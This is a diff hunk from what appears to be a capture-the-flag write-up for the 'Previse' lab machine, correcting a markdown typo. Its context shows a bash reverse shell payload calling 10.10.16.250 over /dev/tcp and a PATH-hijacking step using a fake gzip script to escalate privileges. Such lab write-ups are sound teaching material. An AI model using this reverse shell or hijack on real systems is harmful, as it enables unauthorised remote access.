@@ -310,7 +310,7 @@ The payload that we will be using for reverse shell is:
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.16.250/3000 0>&1
 ```
-Afterwards, we will have to grant permissions to the ```gzip``` file and modify the ```$PATH``` environment variables so that the malicious script can be executed. Lastly, we will have to execute the ```/opt/scripts/access_backup.sh`` script to execute the reverse shell. 
+Afterwards, we will have to grant permissions to the ```gzip``` file and modify the ```$PATH``` environment variables so that the malicious script can be executed. Lastly, we will have to execute the ```/opt/scripts/access_backup.sh``` script to execute the reverse shell. 
 ```code
 m4lwhere@previse:~$ cd /tmp
 m4lwhere@previse:/tmp$ nano gzip
